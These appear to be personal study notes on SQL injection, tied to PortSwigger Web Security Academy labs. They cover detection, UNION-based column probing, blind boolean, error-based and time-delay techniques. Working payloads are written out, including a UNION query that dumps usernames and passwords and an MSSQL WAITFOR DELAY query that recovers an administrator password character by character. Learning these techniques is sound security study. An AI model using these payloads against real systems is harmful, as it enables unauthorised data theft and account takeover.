#  How to detect SQLi vul
- The single quote character ' and look for error or other anomalies
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the app's response
- Payload designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond

# Common locations where SQLi arises:
- In UPDATE statements, within the updated values or the WHERE clause
- In INSERT statements, within the inserted values
- In SELECT statements, within the table or column name
- In SELECT statements, within the ORDER BY clause

# SQLi examples
- Retriveving hidden data: <lab1.md> 
- Subverting application logic: <lab2.md>
- Retrieving data from other database tables
- Blind SQLi vul

# SQLi UNION attacks
- Example:
    SELECT a, b FROM table1 UNION SELECT c, d FROM table2
- For a UNION query to work, 2 key requirements must be met:
    + The individual queries must return the same number of columns
    + The data types in each column must be compatible between the individual queries

- Determining the number of columns required
    + injecting a series of ORDER BY: ' ORDER BY 1-, ' ORDER BY 2-- ect.
    The column in an ORDER BY clause can be specified by its index, so we dont need to know the names of any columns. When the index exceeds the number of actual columns, the database returns an error, such as:
    The ORDER BY position number 3 is out of range of the number of items in the select list.
    + Submitting a series of INION SELECT payloads specifying a different number of null values: ' UNION SELECT NULL--, ' UNION SELECT NULL,NULL-- ect.
    If the number of nulls does not match the number of columns, the database returns an error.
    + LAB3: <lab3.md>

- Database-specific syntax
    SQLi cheet sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

- Finding columns with a useful data type:
Use ' UNION SELECT 'a',NULL,NULL,NULL-- to determine which columns has string data type
LAB: <lab4.md>

- Using a SQL injection UNION attack to retrieve interesting data <lab5.md>
- Retrieving multiple values within a single column
    ' UNION SELECT username || '~' || password FROM users--

Lab6: figure out that can use this syntax: ' UNION SELECT NULL,username FROM users--
so use this to find out credetial        : ' UNION SELECT NULL,username || '~' || password FROM users--

# Blind SQL injection
- Exploiting blind SQLi by triggering conditional responses: <lab7.md>

- Exploiting blind SQLi by triggering conditional errors: <lab8.md>
    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

# Extracting sensitive data via verbose SQL error messages
- Verbose SQL errors caused by database misconfigurations can leak useful information, such as the full SQL query structure. For example, an error after injecting ' may reveal that user input is placed inside a single-quoted string in a WHERE clause, helping attackers craft valid payloads.

- Attackers can also use CAST() to force type-conversion errors and expose query results. For instance:
    CAST((SELECT example_column FROM example_table) AS int)

- If example_column contains text, the database may return an error like:
    ERROR: invalid input syntax for type integer: "Example data"
<lab9.md>
- This can disclose sensitive data directly in error messages, turning a blind SQL injection into a visible one. Error-based extraction is also useful when character limits prevent conditional or boolean-based techniques.

# Exploiting blind SQLi by triggering time delays
- When an application catches database errors and returns the same response for both true and false conditions, error-based and conditional-response techniques no longer work. In this case, attackers can infer results by measuring response time.

- The idea is to inject a condition that causes the database to pause execution only when the condition is true. Since SQL queries are processed synchronously, the HTTP response will also be delayed.

Example in Microsoft SQL Server:

'; IF (1=2) WAITFOR DELAY '0:0:10'--
Condition is false → no delay.
'; IF (1=1) WAITFOR DELAY '0:0:10'--
Condition is true → response delayed by 10 seconds.

This allows attackers to perform boolean tests using timing rather than page content.

To extract data, conditions can be applied to individual characters. For example:

'; IF (
    SELECT COUNT(Username)
    FROM Users
    WHERE Username='Administrator'
      AND SUBSTRING(Password,1,1) > 'm'
) = 1
WAITFOR DELAY '0:0:10'--

Interpretation:

If the first character of the administrator's password is alphabetically greater than 'm', the response is delayed.
Otherwise, the response arrives normally.

By repeatedly testing different characters (often with a binary search approach), an attacker can reconstruct the password one character at a time, even when the application never displays database errors or query results.
<lab10.md>, <lab11.md>